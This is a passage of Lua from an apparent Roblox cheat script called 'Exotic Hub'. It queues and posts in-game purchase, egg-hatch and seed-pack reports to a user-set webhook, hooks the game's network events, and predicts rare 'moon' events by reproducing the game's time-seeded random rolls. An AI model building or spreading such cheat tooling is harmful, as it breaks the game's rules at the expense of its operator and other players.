					description = u.message .. ("\n\nBuyer: ||" .. (tostring(G.username or "Unknown") .. "||"));
					color = u.colour;
					fields = {
						{
							name = "\240\159\144\190 Pet";
							value = "**" .. (d .. "**"),
							inline = false
						},
						{
							name = "\226\173\144 Rarity",
							value = V;
							inline = true
						},
						{
							name = "\240\159\146\176 Price";
							value = "$" .. q.formatShecklesNumber(G.price);
							inline = true
						};
						{
							name = "\240\159\147\143 Size",
							value = c;
							inline = true
						},
						{
							name = "\240\159\140\136 Variant",
							value = J,
							inline = true
						};
						{
							name = "\240\159\146\181 Current Sheckles",
							value = "$" .. q.formatShecklesNumber(G.sheckles);
							inline = true
						}
					};
					footer = {
						text = tostring(y.AppName or "Exotic Hub") .. (" " .. tostring(y.CurentV or ""))
					},
					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
				}
			}
		}
	end;
	QueueTotalControlShopPurchase = function(G, V, j, i, c)
		if not h.webhook_enabled or not Z.TotalControl.IsEnabledTotalControl() then
			return false
		end
		j = tostring(j or "Unknown")
		if ((g.RarityRank[j] or 0)) < ((g.RarityRank.Mythic or 6)) then
			return false
		end
		return Z.Webhooks.Queue(g.ShopPurchase_WebhookData, {
			itemType = tostring(G or "Item"),
			itemName = tostring(V or "Unknown"),
			rarity = j;
			price = math.max(tonumber(i) or 0, 0);
			sheckles = math.max(tonumber(c) or 0, 0);
			username = tostring(y.LocalPlayer and y.LocalPlayer.Name or "Unknown")
		})
	end,
	BuildTotalControlShopPurchasePayload = function(G)
		if type(G) ~= "table" then
			return nil
		end
		local V = tostring(G.rarity or "Unknown")
		local j = Z.Data.GetRarityColor(V)
		local i = tonumber(((tostring(j)):gsub("#", "")), 16) or 5763719
		return {
			username = "Exotic Hub",
			embeds = {
				{
					title = "\240\159\155\146 Total Control " .. (tostring(G.itemType or "Item") .. " Purchase"),
					description = "A Mythic+ shop item was purchased.",
					color = i;
					fields = {
						{
							name = "Item";
							value = "**" .. (tostring(G.itemName or "Unknown") .. "**");
							inline = true
						},
						{
							name = "Rarity";
							value = V;
							inline = true
						};
						{
							name = "Purchase Price";
							value = "$" .. q.formatShecklesNumber(G.price);
							inline = true
						},
						{
							name = "Current Sheckles";
							value = "$" .. q.formatShecklesNumber(G.sheckles);
							inline = true
						};
						{
							name = "Account",
							value = "||@" .. (tostring(G.username or "Unknown") .. "||");
							inline = true
						}
					},
					footer = {
						text = tostring(y.AppName or "Exotic Hub") .. (" " .. tostring(y.CurentV or ""))
					};
					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
				}
			}
		}
	end;
	Post = function(G)
		local V = tostring(h.webhook_url or "")
		if type(G) ~= "table" then
			return false, "Invalid payload"
		end
		if not Z.Webhooks.IsValidUrl(V) then
			return false, "Invalid webhook URL"
		end
		local j, i = pcall(function()
			return y.HttpService:JSONEncode(G)
		end)
		if not j or type(i) ~= "string" then
			return false, "JSON encode failed"
		end
		local c = Z.Webhooks.GetRequestFunction()
		if c then
			local G, y = pcall(function()
				return c({
					Url = V,
					Method = "POST";
					Headers = {
						["Content-Type"] = "application/json"
					};
					Body = i
				})
			end)
			if not G then
				return false, tostring(y)
			end
			if type(y) == "table" then
				local G = tonumber(y.StatusCode or y.Status or y.status_code)
				if G then
					return G >= 200 and G < 300, tostring(G)
				end
				if y.Success ~= nil then
					return y.Success == true, tostring(y.StatusMessage or "")
				end
			end
			return true
		end
		local J, T = pcall(function()
			y.HttpService:PostAsync(V, i, Enum.HttpContentType.ApplicationJson, false)
		end)
		if not J then
			return false, tostring(T)
		end
		return true
	end,
	GetPendingCount = function()
		local G = 0
		if h.webhook_pet_buys and type(g.PetFinder_WebhookData) == "table" then
			G += # g.PetFinder_WebhookData
		end
		if type(g.Mail_WebhookData) == "table" then
			for V, y in ipairs(g.Mail_WebhookData) do
				if type(y) == "table" and Z.Webhooks.IsMailTypeEnabled(y.webhookType) then
					G += 1
				end
			end
		end
		if h.webhook_event_seeds and type(g.EventSeed_WebhookData) == "table" then
			G += # g.EventSeed_WebhookData
		end
		if type(g.ShopPurchase_WebhookData) == "table" then
			G += # g.ShopPurchase_WebhookData
		end
		return G
	end,
	GetNextWebhook = function()
		if type(g.ShopPurchase_WebhookData) == "table" then
			while # g.ShopPurchase_WebhookData > 0 do
				local G = g.ShopPurchase_WebhookData[1]
				if type(G) ~= "table" then
					table.remove(g.ShopPurchase_WebhookData, 1)
					continue
				end
				local V = Z.Webhooks.BuildTotalControlShopPurchasePayload(G)
				if not V then
					table.remove(g.ShopPurchase_WebhookData, 1)
					continue
				end
				return g.ShopPurchase_WebhookData, 1, V, "shop purchase"
			end
		end
		if h.webhook_pet_buys and type(g.PetFinder_WebhookData) == "table" then
			while # g.PetFinder_WebhookData > 0 do
				local G = g.PetFinder_WebhookData[1]
				if type(G) ~= "table" then
					table.remove(g.PetFinder_WebhookData, 1)
					continue
				end
				local V = Z.Webhooks.BuildPetBuyPayload(G)
				if not V then
					table.remove(g.PetFinder_WebhookData, 1)
					continue
				end
				return g.PetFinder_WebhookData, 1, V, "pet purchase"
			end
		end
		if h.webhook_event_seeds and type(g.EventSeed_WebhookData) == "table" then
			while # g.EventSeed_WebhookData > 0 do
				local G = g.EventSeed_WebhookData[1]
				if type(G) ~= "table" then
					table.remove(g.EventSeed_WebhookData, 1)
					continue
				end
				local V = Z.Webhooks.BuildEventSeedPayload(G)
				if not V then
					table.remove(g.EventSeed_WebhookData, 1)
					continue
				end
				return g.EventSeed_WebhookData, 1, V, "event seed"
			end
		end
		if type(g.Mail_WebhookData) ~= "table" then
			g.Mail_WebhookData = {}
		end
		while # g.Mail_WebhookData > 0 do
			local G = g.Mail_WebhookData[1]
			if type(G) ~= "table" or not Z.Webhooks.IsMailTypeEnabled(G.webhookType) then
				table.remove(g.Mail_WebhookData, 1)
				continue
			end
			local V = Z.Webhooks.BuildMailPayload(G)
			if not V then
				table.remove(g.Mail_WebhookData, 1)
				continue
			end
			local y = {
				manual = "manual order";
				automatic = "automatic mail",
				claim = "claimed mail"
			}
			return g.Mail_WebhookData, 1, V, y[G.webhookType] or "mail notification"
		end
		return nil
	end,
	ProcessNext = function()
		local G = type(g.ShopPurchase_WebhookData) == "table" and # g.ShopPurchase_WebhookData > 0 or h.webhook_pet_buys or h.webhook_event_seeds or h.webhook_mail_manual or h.webhook_mail_auto or h.webhook_mail_claims
		if not G then
			Z.Webhooks.ClearStatus()
			return false
		end
		local V = Z.Webhooks.GetPendingCount()
		if not Z.Webhooks.IsValidUrl(h.webhook_url) then
			if V > 0 then
				Z.Webhooks.SetStatus(string.format("Add webhook URL | Pending: %d", V), "#FFCC66")
			else
				Z.Webhooks.SetStatus("Add webhook URL", "#FFCC66")
			end
			return false
		end
		if V == 0 then
			Z.Webhooks.SetStatus("Ready", "#CFCFCF")
			return false
		end
		local y, j, i, c = Z.Webhooks.GetNextWebhook()
		if not y or not i then
			Z.Webhooks.SetStatus("Ready", "#CFCFCF")
			return false
		end
		Z.Webhooks.SetStatus(string.format("Sending %s | Pending: %d", c, V), "#66CCFF")
		local J, T = Z.Webhooks.Post(i)
		if not J then
			Z.Webhooks.SetStatus(string.format("Send failed | Pending: %d", V), "#FF5555")
			warn("[Webhooks]", T)
			return false
		end
		table.remove(y, j)
		Z.Webhooks.SetStatus(string.format("%s sent | Pending: %d", c, Z.Webhooks.GetPendingCount()), "#7CFC00")
		return true
	end;
	Loop = function()
		if not h.webhook_enabled then
			Z.Webhooks.ClearStatus()
			return
		end
		local G, V = pcall(function()
			Z.Webhooks.ProcessNext()
		end)
		if not G then
			Z.Webhooks.SetStatus("Webhook loop error", "#FF5555")
			warn("[Webhooks] Loop error:", V)
		end
	end
}
Z.Webhooks.StartEventSeedListener()
Z.PackOpeningWebhook = {
	StartedPackOpeningWebhook = false,
	ListenerStartedPackOpeningWebhook = false;
	SeenPackOpeningWebhook = {},
	SetStatusPackOpeningWebhook = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.PackOpeningWebhookStatusText = ""
			return false
		end
		g.PackOpeningWebhookStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\148\148 [Open Results]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end;
	GetColourPackOpeningWebhook = function(G)
		local V = Z.Data.GetRarityColor(tostring(G or "Unknown"))
		return tonumber(((tostring(V)):gsub("#", "")), 16) or 5763719
	end;
	MarkSeenPackOpeningWebhook = function(G)
		G = tostring(G or "")
		if G == "" then
			return false
		end
		local V = os.clock()
		for G, y in pairs(Z.PackOpeningWebhook.SeenPackOpeningWebhook) do
			if V - y > 300 then
				Z.PackOpeningWebhook.SeenPackOpeningWebhook[G] = nil
			end
		end
		if Z.PackOpeningWebhook.SeenPackOpeningWebhook[G] then
			return false
		end
		Z.PackOpeningWebhook.SeenPackOpeningWebhook[G] = V
		return true
	end;
	PassesEggFiltersPackOpeningWebhook = function(G)
		if type(G) ~= "table" then
			return false
		end
		if Z.EggHatcher and type(Z.EggHatcher.PassesPetKeepFilterEggHatcher) == "function" then
			local V = Z.EggHatcher.PassesPetKeepFilterEggHatcher(G)
			if V then
				return true
			end
		end
		return Z.PackOpenHelpers.PassesSelectedPackOpenHelpers(h.egg_hatcher_webhook_pets, G.pet) and (Z.PackOpenHelpers.PassesSelectedPackOpenHelpers(h.egg_hatcher_webhook_rarities, G.rarity) and (Z.PackOpenHelpers.PassesSelectedPackOpenHelpers(h.egg_hatcher_webhook_sizes, G.size) and Z.PackOpenHelpers.PassesSelectedPackOpenHelpers(h.egg_hatcher_webhook_variants, G.variant)))
	end;
	PassesSeedPackFiltersPackOpeningWebhook = function(G)
		if type(G) ~= "table" then
			return false
		end
		return Z.PackOpenHelpers.PassesSelectedPackOpenHelpers(h.seed_pack_opener_webhook_seeds, G.seed) and Z.PackOpenHelpers.PassesSelectedPackOpenHelpers(h.seed_pack_opener_webhook_rarities, G.rarity)
	end,
	QueueEggHatchPackOpeningWebhook = function(G, V, j, i, c)
		if not h.webhook_enabled or not h.egg_hatcher_webhook_enabled then
			return false
		end
		V = tostring(V or "")
		j = tostring(j or "")
		if V == "" or j == "" then
			return false
		end
		local J = {
			openId = tostring(G or ""),
			egg = V;
			pet = j,
			displayName = Z.PackOpenHelpers.GetPetDisplayNamePackOpenHelpers(j);
			rarity = Z.PackOpenHelpers.GetPetRarityPackOpenHelpers(j);
			size = Z.PackOpenHelpers.NormaliseSizePackOpenHelpers(i);
			variant = Z.PackOpenHelpers.NormaliseVariantPackOpenHelpers(c),
			username = tostring(y.LocalPlayer and y.LocalPlayer.Name or "Unknown");
			queuedAt = os.time()
		}
		local T = "egg|" .. (J.openId .. ("|" .. (J.egg .. ("|" .. (J.pet .. ("|" .. (J.size .. ("|" .. J.variant))))))))
		if not Z.PackOpeningWebhook.MarkSeenPackOpeningWebhook(T) or not Z.PackOpeningWebhook.PassesEggFiltersPackOpeningWebhook(J) then
			return false
		end
		table.insert(g.EggHatcherWebhookData, J)
		return true
	end,
	QueueSeedPackPackOpeningWebhook = function(G, V, j)
		if not h.webhook_enabled or not h.seed_pack_opener_webhook_enabled then
			return false
		end
		V = tostring(V or "")
		j = tostring(j or "")
		if V == "" or j == "" then
			return false
		end
		local i = {
			openId = tostring(G or "");
			pack = V;
			seed = j;
			rarity = Z.PackOpenHelpers.GetSeedRarityPackOpenHelpers(j);
			username = tostring(y.LocalPlayer and y.LocalPlayer.Name or "Unknown");
			queuedAt = os.time()
		}
		local c = "seedpack|" .. (i.openId .. ("|" .. (i.pack .. ("|" .. i.seed))))
		if not Z.PackOpeningWebhook.MarkSeenPackOpeningWebhook(c) or not Z.PackOpeningWebhook.PassesSeedPackFiltersPackOpeningWebhook(i) then
			return false
		end
		table.insert(g.SeedPackOpenerWebhookData, i)
		return true
	end;
	GetEggPetLabelPackOpeningWebhook = function(G)
		if type(G) ~= "table" then
			return "Unknown"
		end
		local V = tostring(G.displayName or G.pet or "Unknown")
		if tostring(G.size or "Normal") ~= "Normal" then
			V = tostring(G.size) .. (" " .. V)
		end
		if tostring(G.variant or "Normal") ~= "Normal" then
			V = tostring(G.variant) .. (" " .. V)
		end
		return V
	end;
	IsSpecialEggHatchPackOpeningWebhook = function(G)
		if type(G) ~= "table" then
			return false
		end
		if Z.EggHatcher and (type(Z.EggHatcher.IsSuperRarityEggHatcher) == "function" and Z.EggHatcher.IsSuperRarityEggHatcher(G.rarity)) then
			return true
		end
		if tostring(G.size or "Normal") ~= "Normal" then
			return true
		end
		if tostring(G.variant or "Normal") ~= "Normal" then
			return true
		end
		if not Z.PackOpenHelpers.SelectionIsEmptyPackOpenHelpers(h.egg_hatcher_webhook_rarities) and Z.PackOpenHelpers.IsSelectedPackOpenHelpers(h.egg_hatcher_webhook_rarities, G.rarity) then
			return true
		end
		if not Z.PackOpenHelpers.SelectionIsEmptyPackOpenHelpers(h.egg_hatcher_keep_rarities) and Z.PackOpenHelpers.IsSelectedPackOpenHelpers(h.egg_hatcher_keep_rarities, G.rarity) then
			return true
		end
		if Z.EggHatcher and type(Z.EggHatcher.PassesPetKeepFilterEggHatcher) == "function" then
			local V = Z.EggHatcher.PassesPetKeepFilterEggHatcher(G)
			if V then
				return true
			end
		end
		return false
	end;
	BuildEggPayloadPackOpeningWebhook = function(G)
		if type(G) ~= "table" then
			return nil
		end
		local V = Z.PackOpeningWebhook.GetEggPetLabelPackOpeningWebhook(G)
		return {
			username = "Exotic Hub",
			embeds = {
				{
					title = "\240\159\165\154 Egg Hatched!";
					description = "A pet hatched from an egg.",
					color = Z.PackOpeningWebhook.GetColourPackOpeningWebhook(G.rarity);
					fields = {
						{
							name = "\240\159\165\154 Egg";
							value = "**" .. (tostring(G.egg or "Unknown") .. "**");
							inline = true
						};
						{
							name = "\240\159\144\190 Pet";
							value = "**" .. (V .. "**");
							inline = true
						};
						{
							name = "\226\173\144 Rarity";
							value = tostring(G.rarity or "Unknown"),
							inline = true
						};
						{
							name = "\240\159\147\143 Size";
							value = tostring(G.size or "Normal");
							inline = true
						},
						{
							name = "\240\159\140\136 Variant";
							value = tostring(G.variant or "Normal");
							inline = true
						},
						{
							name = "\240\159\145\164 Account",
							value = "||@" .. (tostring(G.username or "Unknown") .. "||"),
							inline = true
						}
					},
					footer = {
						text = tostring(y.AppName or "Exotic Hub") .. (" " .. tostring(y.CurentV or ""))
					};
					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
				}
			}
		}
	end,
	BuildGroupedEggPayloadPackOpeningWebhook = function(G)
		if type(G) ~= "table" then
			return nil, 0
		end
		local V = {}
		local j = {}
		local i = 0
		local c = "Unknown"
		for G, y in ipairs(G) do
			if type(y) ~= "table" or Z.PackOpeningWebhook.IsSpecialEggHatchPackOpeningWebhook(y) then
				break
			end
			i += 1
			c = tostring(y.username or c)
			local J = tostring(y.egg or "Unknown")
			j[J] = ((j[J] or 0)) + 1
			table.insert(V, "\226\157\140 " .. (Z.PackOpeningWebhook.GetEggPetLabelPackOpeningWebhook(y) .. (" [" .. (tostring(y.rarity or "Unknown") .. "]"))))
			if i >= 20 then
				break
			end
		end
		if i <= 0 then
			return nil, 0
		end
		local J = {}
		for G, V in pairs(j) do
			table.insert(J, tostring(G) .. (" x" .. tostring(V)))
		end
		table.sort(J)
		local T = table.concat(V, "\n")
		if # T > 950 then
			T = T:sub(1, 930) .. "\n..."
		end
		return {
			username = "Exotic Hub",
			embeds = {
				{
					title = "\240\159\165\154 Hatch Report",
					description = "-> Session Info:\n| \240\159\145\164 Username: ||@" .. (c .. ("||\n| \240\159\150\165\239\184\143 Server Version: v" .. (tostring(game.PlaceVersion or "?") .. ("\n\n-> Stats:\n| \240\159\165\154 Eggs Used: " .. (tostring(i) .. ("\n\n-> Eggs:\n| " .. table.concat(J, "\n| "))))))),
					color = 5793266;
					fields = {
						{
							name = "-> Pets Hatched (" .. (tostring(i) .. "):"),
							value = T;
							inline = false
						}
					};
					footer = {
						text = tostring(y.AppName or "Exotic Hub") .. (" " .. tostring(y.CurentV or ""))
					},
					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
				}
			}
		}, i
	end,
	BuildSeedPackPayloadPackOpeningWebhook = function(G)
		if type(G) ~= "table" then
			return nil
		end
		return {
			username = "Exotic Hub";
			embeds = {
				{
					title = "\240\159\142\129 Seed Pack Opened!";
					description = "A seed pack produced a seed.";
					color = Z.PackOpeningWebhook.GetColourPackOpeningWebhook(G.rarity),
					fields = {
						{
							name = "\240\159\142\129 Pack",
							value = "**" .. (tostring(G.pack or "Unknown") .. "**");
							inline = true
						};
						{
							name = "\240\159\140\177 Seed";
							value = "**" .. (tostring(G.seed or "Unknown") .. "**");
							inline = true
						},
						{
							name = "\226\173\144 Rarity",
							value = tostring(G.rarity or "Unknown"),
							inline = true
						},
						{
							name = "\240\159\145\164 Account",
							value = "||@" .. (tostring(G.username or "Unknown") .. "||");
							inline = true
						}
					},
					footer = {
						text = tostring(y.AppName or "Exotic Hub") .. (" " .. tostring(y.CurentV or ""))
					};
					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
				}
			}
		}
	end;
	GetPendingCountPackOpeningWebhook = function()
		local G = 0
		if h.egg_hatcher_webhook_enabled and type(g.EggHatcherWebhookData) == "table" then
			G += # g.EggHatcherWebhookData
		end
		if h.seed_pack_opener_webhook_enabled and type(g.SeedPackOpenerWebhookData) == "table" then
			G += # g.SeedPackOpenerWebhookData
		end
		return G
	end,
	ProcessPackOpeningWebhook = function()
		if not h.webhook_enabled then
			Z.PackOpeningWebhook.SetStatusPackOpeningWebhook("")
			return false
		end
		local G
		local V
		local y = 1
		local j = "open result"
		if h.egg_hatcher_webhook_enabled and (type(g.EggHatcherWebhookData) == "table" and # g.EggHatcherWebhookData > 0) then
			V = g.EggHatcherWebhookData
			if Z.PackOpeningWebhook.IsSpecialEggHatchPackOpeningWebhook(V[1]) then
				G = Z.PackOpeningWebhook.BuildEggPayloadPackOpeningWebhook(V[1])
				j = "egg hatch"
			else
				G, y = Z.PackOpeningWebhook.BuildGroupedEggPayloadPackOpeningWebhook(V)
				j = "egg hatch report"
			end
		elseif h.seed_pack_opener_webhook_enabled and (type(g.SeedPackOpenerWebhookData) == "table" and # g.SeedPackOpenerWebhookData > 0) then
			V = g.SeedPackOpenerWebhookData
			G = Z.PackOpeningWebhook.BuildSeedPackPayloadPackOpeningWebhook(V[1])
			j = "seed pack"
		end
		if not V or not G then
			local G = Z.PackOpeningWebhook.GetPendingCountPackOpeningWebhook()
			if G <= 0 then
				Z.PackOpeningWebhook.SetStatusPackOpeningWebhook("")
			end
			return false
		end
		if not Z.Webhooks or type(Z.Webhooks.Post) ~= "function" or not Z.Webhooks.IsValidUrl(h.webhook_url) then
			Z.PackOpeningWebhook.SetStatusPackOpeningWebhook("Add webhook URL | Pending: " .. tostring(Z.PackOpeningWebhook.GetPendingCountPackOpeningWebhook()), "#FFCC66")
			return false
		end
		Z.PackOpeningWebhook.SetStatusPackOpeningWebhook("Sending " .. (j .. (" | Pending: " .. tostring(Z.PackOpeningWebhook.GetPendingCountPackOpeningWebhook()))), "#66CCFF")
		local i, c = Z.Webhooks.Post(G)
		if not i then
			Z.PackOpeningWebhook.SetStatusPackOpeningWebhook("Send failed | Pending: " .. tostring(Z.PackOpeningWebhook.GetPendingCountPackOpeningWebhook()), "#FF5555")
			warn("[PackOpeningWebhook]", c)
			return false
		end
		for G = 1, math.max(math.floor(tonumber(y) or 1), 1), 1 do
			if # V <= 0 then
				break
			end
			table.remove(V, 1)
		end
		Z.PackOpeningWebhook.SetStatusPackOpeningWebhook(j .. (" sent | Pending: " .. tostring(Z.PackOpeningWebhook.GetPendingCountPackOpeningWebhook())), "#7CFC00")
		return true
	end;
	HookPackOpeningListenersPackOpeningWebhook = function()
		if Z.PackOpeningWebhook.ListenerStartedPackOpeningWebhook then
			return false
		end
		Z.PackOpeningWebhook.ListenerStartedPackOpeningWebhook = true
		local G = y.Networking and (y.Networking.Egg and y.Networking.Egg.ReplicateOpenEgg)
		if G and G.OnClientEvent then
			G.OnClientEvent:Connect(function(G, V, j, i, c, J, T)
				if G == y.LocalPlayer then
					Z.EggHatcher.ProcessHatchResultEggHatcher(V, j, i, J, T, "Egg")
					Z.PackOpeningWebhook.QueueEggHatchPackOpeningWebhook(V, j, i, J, T)
				end
			end)
		end
		local V = y.Networking and (y.Networking.Egg and y.Networking.Egg.ReplicateHatchInPlace)
		if V and V.OnClientEvent then
			V.OnClientEvent:Connect(function(G, V, j, i, c, J, T)
				if G == y.LocalPlayer then
					Z.EggHatcher.ProcessHatchResultEggHatcher(V, j, i, J, T, "In-place Egg")
					Z.PackOpeningWebhook.QueueEggHatchPackOpeningWebhook(V, j, i, J, T)
				end
			end)
		end
		local j = y.Networking and (y.Networking.SeedPack and y.Networking.SeedPack.ReplicateOpenSeedPack)
		if j and j.OnClientEvent then
			j.OnClientEvent:Connect(function(G, V, j, i, c)
				if G == y.LocalPlayer then
					Z.PackOpeningWebhook.QueueSeedPackPackOpeningWebhook(V, j, i)
				end
			end)
		end
		return true
	end;
	StartPackOpeningWebhook = function()
		if Z.PackOpeningWebhook.StartedPackOpeningWebhook then
			return false
		end
		Z.PackOpeningWebhook.StartedPackOpeningWebhook = true
		Z.PackOpeningWebhook.HookPackOpeningListenersPackOpeningWebhook()
		task.spawn(function()
			while not g.is_forced_stop do
				task.wait(3)
				local G, V = pcall(Z.PackOpeningWebhook.ProcessPackOpeningWebhook)
				if not G then
					Z.PackOpeningWebhook.SetStatusPackOpeningWebhook("Webhook error", "#FF5555")
					warn("[PackOpeningWebhook]", V)
				end
			end
		end)
		return true
	end
}
Z.PackOpeningWebhook.StartPackOpeningWebhook()
g.MoonPredictorStatusText = ""
Z.MoonPredictor = {
	Started = false,
	DebugBusy = false;
	Label = nil;
	RollMode = "number",
	ValidationText = "Waiting for a night to validate";
	Colours = {
		Moon = "#B7C9FF";
		Goldmoon = "#FFD700",
		["Rainbow Moon"] = "#FF66FF";
		Bloodmoon = "#FF4444"
	},
	GetNight = function()
		local G = y.TimeCycleData and (y.TimeCycleData.Data and y.TimeCycleData.Data.Night)
		if type(G) ~= "table" or type(G.Weathers) ~= "table" then
			return nil
		end
		return G
	end;
	GetServerTime = function()
		local G, V = pcall(function()
			return y.Workspace:GetServerTimeNow()
		end)
		return G and tonumber(V) or os.time()
	end,
	Pick = function(G, V)
		local y = Z.MoonPredictor.GetNight()
		if not y then
			return nil
		end
		local j = 0
		for G, V in y.Weathers do
			if type(V) == "table" then
				j += tonumber(V.Chance) or 0
			end
		end
		if j <= 0 then
			return nil
		end
		local i = math.floor(tonumber(G) or 0) * 1000 + 3
		local c = Random.new(i)
		local J = V == "integer" and c:NextInteger(1, math.floor(j)) or c:NextNumber(0, j)
		local T = 0
		for G, V in y.Weathers do
			if type(V) ~= "table" then
				continue
			end
			T += tonumber(V.Chance) or 0
			if J <= T then
				return tostring(G), J, i
			end
		end
		return "Moon", J, i
	end,
	ValidateCurrent = function()
		if tostring(y.Workspace:GetAttribute("ActivePhase") or "") ~= "Night" then
			return false
		end
		local G = tostring(y.Workspace:GetAttribute("ActiveWeather") or "")
		local V = Z.MoonPredictor.GetNight()
		if not V or type(V.Weathers[G]) ~= "table" then
			return false
		end
		local j = math.floor(os.time() / 600)
		local i = Z.MoonPredictor.Pick(j, "number")
		local c = Z.MoonPredictor.Pick(j, "integer")
		if i == G and c ~= G then
			Z.MoonPredictor.RollMode = "number"
			Z.MoonPredictor.ValidationText = "NextNumber confirmed by live moon"
			return true
		end
		if c == G and i ~= G then
			Z.MoonPredictor.RollMode = "integer"
			Z.MoonPredictor.ValidationText = "NextInteger confirmed by live moon"
			return true
		end
		if i == G and c == G then
			Z.MoonPredictor.ValidationText = "Both methods match the live moon"
			return true
		end
		Z.MoonPredictor.ValidationText = "Live moon differs; it may be forced"
		return false
	end,
	GetNextNightAt = function()
		local G = Z.MoonPredictor.GetServerTime()
		local V = tostring(y.Workspace:GetAttribute("ActivePhase") or "")
		local j = tonumber(y.Workspace:GetAttribute("PhaseDuration"))
		local i = y.TimeCycleData and y.TimeCycleData.Data
		local c = i and (i.Day and tonumber(i.Day.Lasts)) or 450
		local J = i and (i.Sunset and tonumber(i.Sunset.Lasts)) or 30
		if j then
			if V == "Night" then
				return (j + c) + J
			elseif V == "Day" then
				return j + J
			elseif V == "Sunset" then
				return j
			end
		end
		local T = math.floor(G / 600) * 600
		local d = (T + c) + J
		return G < d and d or d + 600
	end,
	GetRare = function(G, V)
		G = math.clamp(math.floor(tonumber(G) or 1), 1, 20)
		V = V == "integer" and "integer" or "number"
		local y = Z.MoonPredictor.GetNextNightAt()
		local j = math.floor(y / 600)
		local i = {}
		for c = 0, 999, 1 do
			local J, T, d = Z.MoonPredictor.Pick(j + c, V)
			if J and J ~= "Moon" then
				table.insert(i, {
					Name = J,
					At = y + c * 600;
					Roll = T;
					Seed = d
				})
				if # i >= G then
					break
				end
			end
		end
		return i
	end,
	FormatTime = function(G)
		G = math.max(math.floor(tonumber(G) or 0), 0)
		local V = math.floor(G / 3600)
		local y = math.floor(((G % 3600)) / 60)
		local Z = G % 60
		if V > 0 then
			return string.format("%dh %02dm", V, y)
		end
		if y > 0 then
			return string.format("%dm %02ds", y, Z)
		end
		return string.format("%ds", Z)
	end,
	GetLines = function(G, V, y)
		local j = Z.MoonPredictor.GetServerTime()
		local i = {}
		for G, V in ipairs(Z.MoonPredictor.GetRare(V, G)) do
			if y then
				table.insert(i, string.format("%d. **%s** \226\128\148 <t:%d:R> (`%d`)", G, V.Name, math.floor(V.At), V.Seed))
			else
				local G = Z.MoonPredictor.Colours[V.Name] or "#FFFFFF"
				table.insert(i, string.format("<font color=\'%s\'>%s</font> <font color=\'#7CFC00\'>in %s</font>", G, V.Name, Z.MoonPredictor.FormatTime(V.At - j)))
			end
		end
		return i
	end;
	Update = function()
		if not h.moon_predictor_enabled then
			g.MoonPredictorStatusText = ""
			if Z.MoonPredictor.Label and type(Z.MoonPredictor.Label.SetText) == "function" then
				Z.MoonPredictor.Label:SetText("<font color=\'#AFAFAF\'>Moon predictor disabled.</font>")
			end
			return
		end
		Z.MoonPredictor.ValidateCurrent()
		local G = Z.MoonPredictor.GetServerTime()
		local V = tostring(y.Workspace:GetAttribute("ActivePhase") or "Unknown")
		local j = tostring(y.Workspace:GetAttribute("ActiveWeather") or "Unknown")
		local i = tonumber(y.Workspace:GetAttribute("PhaseDuration")) or G
		local c = {}
		if V == "Night" then
			table.insert(c, string.format("<b>Current:</b> <font color=\'%s\'>%s</font> <font color=\'#AFAFAF\'>(%s left)</font>", Z.MoonPredictor.Colours[j] or "#FFFFFF", j, Z.MoonPredictor.FormatTime(i - G)))
		else
			table.insert(c, string.format("<b>Next Night:</b> <font color=\'#B7C9FF\'>in %s</font>", Z.MoonPredictor.FormatTime(Z.MoonPredictor.GetNextNightAt() - G)))
		end
		table.insert(c, "<font color=\'#AFAFAF\'>Upcoming rare moons:</font>")
		for G, V in ipairs(Z.MoonPredictor.GetLines(Z.MoonPredictor.RollMode, 8, false)) do
			table.insert(c, V)
		end
		if Z.MoonPredictor.Label and type(Z.MoonPredictor.Label.SetText) == "function" then
			Z.MoonPredictor.Label:SetText(table.concat(c, "\n"))
		end
		local J = (Z.MoonPredictor.GetRare(1, Z.MoonPredictor.RollMode))[1]
		if not J then
			g.MoonPredictorStatusText = ""
			return
		end
		g.MoonPredictorStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\140\153 [Moon]</font> <font color=\'%s\'>%s in %s</font></stroke>", Z.MoonPredictor.Colours[J.Name] or "#FFFFFF", J.Name, Z.MoonPredictor.FormatTime(J.At - G))
	end,
	SendDebugPost = function()
		if Z.MoonPredictor.DebugBusy then
			return false, "Debug post already running"
		end
		if not h.webhook_enabled or not Z.Webhooks.IsValidUrl(h.webhook_url) then
			return false, "Add and enable your webhook first"
		end
		Z.MoonPredictor.DebugBusy = true
		Z.MoonPredictor.ValidateCurrent()
		local G = math.floor(os.time() / 600)
		local V, j, i = Z.MoonPredictor.Pick(G, "number")
		local c, J, T = Z.MoonPredictor.Pick(G, "integer")
		local d = table.concat(Z.MoonPredictor.GetLines("number", 12, true), "\n")
		local u = table.concat(Z.MoonPredictor.GetLines("integer", 12, true), "\n")
		local q = {
			username = "Exotic Hub",
			embeds = {
				{
					title = "\240\159\140\153 Moon Predictor Debug";
					description = string.format("Live: **%s / %s**\nNext Night: <t:%d:R>\nSelected: **%s**\nValidation: %s", tostring(y.Workspace:GetAttribute("ActivePhase") or "Unknown"), tostring(y.Workspace:GetAttribute("ActiveWeather") or "Unknown"), math.floor(Z.MoonPredictor.GetNextNightAt()), Z.MoonPredictor.RollMode, Z.MoonPredictor.ValidationText),
					color = 9268223,
					fields = {
						{
							name = "NextNumber";
							value = d ~= "" and d or "No predictions";
							inline = false
						};
						{
							name = "NextInteger";
							value = u ~= "" and u or "No predictions",
							inline = false
						};
						{
							name = "Current cycle",
							value = string.format("Cycle `%d`\nNumber `%s` roll `%.6f` seed `%d`\nInteger `%s` roll `%s` seed `%d`", G, tostring(V), tonumber(j) or 0, tonumber(i) or 0, tostring(c), tostring(J), tonumber(T) or 0);
							inline = false
						}
					};
					footer = {
						text = tostring(y.AppName or "Exotic Hub") .. (" " .. tostring(y.CurentV or ""))
					},
					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
				}
			}
		}
		local g, E = Z.Webhooks.Post(q)
		Z.MoonPredictor.DebugBusy = false
		warn("[Moon Predictor][NextNumber]\n" .. d)
		warn("[Moon Predictor][NextInteger]\n" .. u)
